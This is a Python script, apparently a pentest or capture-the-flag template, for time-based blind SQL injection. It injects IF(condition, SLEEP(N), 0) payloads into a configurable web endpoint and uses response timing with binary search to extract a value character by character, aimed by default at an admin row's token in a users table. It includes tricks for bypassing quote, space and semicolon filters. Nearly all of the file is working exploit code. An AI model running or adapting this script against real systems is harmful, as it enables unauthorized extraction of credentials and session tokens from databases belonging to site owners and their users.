#!/usr/bin/env python3
"""
Time-Based Blind SQLi Extraction Script (Template)
====================================================
Use when: injection point is in an UPDATE/INSERT/DELETE statement (no SELECT output),
          or when boolean blind has no visible response difference.
          The only oracle is response time (SLEEP).

Typical scenario: Java/PHP endpoint with an UPDATE query like:
    UPDATE users SET isActive=true WHERE id=<injectable>
No query results are returned to the client, so boolean-based extraction won't work.
SLEEP() in the injected condition creates a measurable time delay.

Filter bypass covered:
  - Java escapeString that strips ' " \\ \\n ;  →  use ASCII/LENGTH/SUBSTRING (returns numbers, no quotes needed)
  - PHP strpos space filter                    →  use /**/ instead of spaces
  - No semicolons                              →  use IF(cond, SLEEP(N), 0) without stacked queries

Config: URL, METHOD, PARAM, COOKIE, SLEEP_SECONDS, TABLE, COLUMN, ROW_CONDITION
        ROW_CONDITION: WHERE clause to find the target row (e.g., "role_id=1" or "LENGTH(token)=64")
"""
import time
import sys

try:
    import requests
except ImportError:
    print("[-] pip install requests")
    sys.exit(1)

# ==================== CONFIG ====================
URL = "http://target/api/activate"   # Endpoint with the injectable UPDATE
METHOD = "POST"                       # "POST" or "GET"
PARAM = "id"                          # Parameter name that gets injected
SESSION_COOKIE = ""                   # PHPSESSID / JSESSIONID, leave "" if none
COOKIE_NAME = "PHPSESSID"
SLEEP_SECONDS = 2                     # Delay for TRUE condition (adjust: too low = false positives)

TABLE = "users"
COLUMN = "token"
# How to find the admin row without knowing its ID:
ROW_CONDITION = "role_id=1"           # e.g., "role_id=1" or "LENGTH(token)=64"
# ================================================

COOKIES = {COOKIE_NAME: SESSION_COOKIE} if SESSION_COOKIE else {}


def check(condition):
    """
    Time-based blind: if condition is TRUE → SLEEP(SLEEP_SECONDS) → slow response.
                      if condition is FALSE → returns 0 immediately → fast response.

    Payload: 1 OR IF((condition), SLEEP(2), 0)

    Bypass notes:
      - No quotes needed: ASCII/LENGTH/SUBSTRING return integers
      - No spaces needed: use /**/ if space-filtered (add per-filter)
      - No semicolons needed: IF() is an inline expression, not a stacked query
      - No backslash needed: no string literals in the payload
    """
    payload = "1 OR IF((" + condition + "),SLEEP(" + str(SLEEP_SECONDS) + "),0)"
    data = {PARAM: payload}

    start = time.time()
    if METHOD == "POST":
        requests.post(URL, data=data, cookies=COOKIES, timeout=10)
    else:
        requests.get(URL, params=data, cookies=COOKIES, timeout=10)
    elapsed = time.time() - start

    return elapsed >= SLEEP_SECONDS


def main():
    print("=" * 55)
    print("  Time-Based Blind SQLi - Extract " + COLUMN)
    print("=" * 55)
    print("  URL    :", URL)
    print("  Method :", METHOD, "(" + PARAM + "=...)")
    print("  Target :", TABLE + "." + COLUMN + " WHERE " + ROW_CONDITION)
    print("  Sleep  :", SLEEP_SECONDS, "s")
    print("=" * 55)
    print()

    # Sanity check
    print("[*] Sanity check...")
    t1 = time.time()
    r1 = check("1=1")
    t1_elapsed = time.time() - t1
    t2 = time.time()
    r2 = check("1=2")
    t2_elapsed = time.time() - t2
    print("    1=1:", str(round(t1_elapsed, 2)) + "s", "(True)" if r1 else "(False)")
    print("    1=2:", str(round(t2_elapsed, 2)) + "s", "(True)" if r2 else "(False)")

    if not r1:
        print("[!] FAIL: 1=1 did not trigger SLEEP")
        print("[!] Check: URL, cookie, endpoint, SLEEP support on DBMS")
        return
    if r2:
        print("[!] FAIL: 1=2 triggered SLEEP (should be fast)")
        return
    print("[+] Injection confirmed")
    print()

    # Discover token length dynamically (don't assume)
    print("[*] Finding length of " + COLUMN + "...")
    length = 0
    for n in range(1, 200):
        cond = "SELECT LENGTH(" + COLUMN + ") FROM " + TABLE + " WHERE " + ROW_CONDITION + " LIMIT 1"
        if check(cond + "=" + str(n)):
            length = n
            break
    if length == 0:
        print("[!] Could not find " + COLUMN + " (check ROW_CONDITION)")
        return
    print("[+] Length:", length)
    print()

    # Extract each char via binary search
    print("[*] Extracting " + str(length) + " chars (binary search)...")
    print()

    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            cond = (
                "SELECT ASCII(SUBSTRING(" + COLUMN + "," + str(pos) + ",1))"
                " FROM " + TABLE + " WHERE " + ROW_CONDITION + " LIMIT 1"
                ">" + str(mid)
            )
            if check(cond):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        pct = int(pos / length * 100)
        bar = "#" * (pct // 5) + "-" * (20 - pct // 5)
        print("  [" + str(pos) + "/" + str(length) + "] " + bar + " " + str(pct).rjust(3) + "%  =>  " + result)

    print()
    print("=" * 55)
    print("  RESULT: " + COLUMN + " = " + result)
    print("=" * 55)


if __name__ == "__main__":
    main()
